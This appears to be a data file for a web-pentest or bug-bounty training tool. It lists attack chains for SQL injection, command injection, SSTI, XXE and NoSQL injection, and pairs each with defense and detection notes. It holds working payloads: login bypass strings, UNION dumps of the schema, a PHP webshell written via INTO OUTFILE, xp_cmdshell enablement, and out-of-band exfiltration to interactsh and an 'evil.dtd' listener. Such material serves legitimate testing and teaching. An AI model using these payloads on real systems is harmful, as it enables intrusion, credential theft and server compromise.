chains.title: SQLi: authentication bypass with a single quote
chains.impact: Log in as admin without a password.
chains.why: The most iconic SQLi payload and the fastest win on a legacy login form.
chains.precondition: A login form where the query is concatenated from input: SELECT * FROM users WHERE user='$u' AND pass='$p'.
chains.realWorld: OWASP SQLi auth-bypass; PortSwigger SQL injection labs.
chains.defense: Prepared statements + server-side password hashing (bcrypt/argon2); alert on OR '1'='1 in auth parameters.

steps.title: Try the username field
steps.success: redirect to dashboard / session cookie issued

steps.title: If it errors on multiple rows
Run a bypass wordlist in Intruder
steps.detail: load 30+ variants (' or 1=1#, ") or ("1"="1, ...) when quotes/brackets differ

steps.title: The app compares a password hash
steps.detail: admin' AND 1=0 UNION SELECT 'admin','<md5(P@ssw0rd)>'-- -  (log in with a known plaintext)

chains.title: SQLi: dumping the database via UNION
chains.impact: Full database read (users, password hashes, PII, API keys), critical when PII is involved.
chains.why: UNION is the fastest and most visual way to turn a single reflected parameter into a full dump.
chains.precondition: A parameter whose value is reflected on the page (product id, search) where the query returns visible rows.
chains.defense: Parameterized queries; a WAF catches UNION SELECT and information_schema.

steps.title: Break the query
steps.success: a 500 or 'error in your SQL syntax' appears/disappears

steps.title: Confirm the injection with boolean logic
steps.detail: id=1' AND 1=1-- -  (normal)  vs  id=1' AND 1=2-- -  (rows disappear)

steps.title: Find a string/visible column
steps.detail: ' UNION SELECT NULL,'AAA',NULL-- -  (wherever AAA is printed is your output channel)

steps.title: Extract the schema
steps.detail: ' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

chains.title: SQLi: blind extraction (boolean and time-based)
chains.impact: The same full database read, but through a parameter with no visible output.
chains.why: Most real-world SQLi is blind (login, cookie, headers, JSON), so binary search is the fundamental skill that separates a beginner from a hunter.
chains.precondition: An injection where the response is identical but behavior differs on true/false (boolean) or you can induce a delay (time).
chains.defense: Parameterization; thousands of near-identical requests with SUBSTRING/ASCII or SLEEP are a clear WAF/IDS signal.

steps.title: Establish a true/false oracle
steps.detail: id=1 AND 1=1-- -  (page A)  vs  id=1 AND 1=2-- -  (page B)

steps.title: Extract by bisection (boolean)
steps.detail: python3 sqli_boolean_blind.py -u 'https://t/item?id=1*' -m 'Welcome' -q '(SELECT password FROM users LIMIT 1)'  (~7 requests/char)

steps.title: If there's no content difference, prove it with time
OOB shortcut if egress is allowed
steps.detail: LOAD_FILE(CONCAT('\\\\',(SELECT pass FROM users LIMIT 1),'.id.oast.pro\\a'))  and watch interactsh

steps.title: Hand it off to the tool

chains.title: SQLi → RCE: from injection to shell
chains.impact: Code execution on the database/web host (full server compromise).
chains.why: Escalating a data-only SQLi into RCE is the biggest impact multiplier; three paths are canonical (MySQL file write, MSSQL xp_cmdshell, PostgreSQL COPY PROGRAM).
chains.precondition: SQLi with high database privileges (FILE / sysadmin / superuser).
chains.realWorld: PayloadsAllTheThings SQLi (INTO OUTFILE / xp_cmdshell / COPY PROGRAM).
chains.defense: Least-privilege database account (no FILE/sysadmin), secure_file_priv, disabled xp_cmdshell.

steps.title: Check privileges and the write path
MySQL: webshell via INTO OUTFILE
steps.detail: ... UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/x.php'  then /x.php?cmd=id

steps.title: MSSQL: enable and run xp_cmdshell
steps.detail: EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; then EXEC xp_cmdshell 'whoami'

chains.title: OS Command Injection → reverse shell
chains.impact: Arbitrary command execution and an interactive reverse shell on the host.
chains.why: Anywhere the app shells out (ping, DNS, image/PDF converters), this is a direct path to RCE.
chains.precondition: A feature that passes input to a system shell (ping -c4 $ip, convert, nslookup, export).
chains.defense: Shell-free exec-array APIs, strict allowlists; ;, |, $(, ${IFS}, sleep in parameters = high signal.

steps.title: Inject inside the command
steps.detail: $(id)  /  `id`  when input lands in the middle of an argument

steps.title: If output is hidden, prove it blind
steps.q: Time-based command injection detector (separators x sleep)

chains.title: SSTI → RCE: from ${7*7} to shell
chains.impact: Remote code execution on the application server.
chains.why: Template injection hides in name fields, PDF/invoice/email generators, and 'preview', and the detect-fingerprint-escalate pattern is the same across five engines.
chains.precondition: Input rendered back through a server-side template (greeting, email subject/body, a generated document).
chains.realWorld: James Kettle 'Server-Side Template Injection' (Black Hat); Hackmanit template-injection-table.
chains.defense: Never render input as a template; sandbox the engine; {{, ${, __globals__ = strong signals.

chains.title: XXE: file read, SSRF, and blind OOB exfiltration
chains.impact: Arbitrary file read (secrets, source code, web.config), internal SSRF, OOB data theft (higher when cloud metadata is reachable).
chains.why: XML parsers are everywhere (SOAP, SAML, SVG/DOCX upload, REST that silently accepts XML), and a single DOCTYPE yields three different high-impact primitives.
chains.precondition: An endpoint that parses XML (or can be coerced to via Content-Type: application/xml) with external entities enabled.
chains.realWorld: Yunusov 'XML Out-Of-Band Data Retrieval' (2013); PortSwigger XXE labs.
chains.defense: Disable DTD/external entities (disallow-doctype-decl); outbound to Collaborator, or file://, php://filter in XML is a signal.

steps.title: Confirm entity parsing
steps.detail: <!ENTITY example "Doe">  and check whether it expanded in a reflected field

steps.title: Grab source via the PHP wrapper
Go blind OOB via an external DTD
steps.q: Blind XXE OOB exfil server (evil.dtd + base64 catcher)
steps.detail: host evil.dtd, point to <!DOCTYPE x SYSTEM "http://you/evil.dtd">, catch base64 on a listener

chains.title: NoSQL injection: login bypass and blind extraction
chains.impact: Logging in without a password and exfiltrating data field by field.
chains.why: Modern MEAN/MERN apps are full of MongoDB query objects, and swapping a value for an operator ($ne/$gt/$regex) is an easy, common bypass.
chains.precondition: Input reaches a MongoDB query filter and the parser accepts objects (JSON body or param[$op]= in form-urlencoded).
chains.realWorld: PayloadsAllTheThings NoSQL Injection; Root Me 'NoSQL injection'.
chains.defense: Cast input to a string and reject objects/$-keys; alert on [$ne], $regex, $where, $gt in bodies.

steps.title: Blindly extract the password via $regex
steps.detail: {"username":{"$eq":"admin"},"password":{"$regex":"^m"}}  grow the prefix on TRUE responses

steps.title: Automate the extraction
steps.detail: MongoDB blind extractor ($regex char by char)
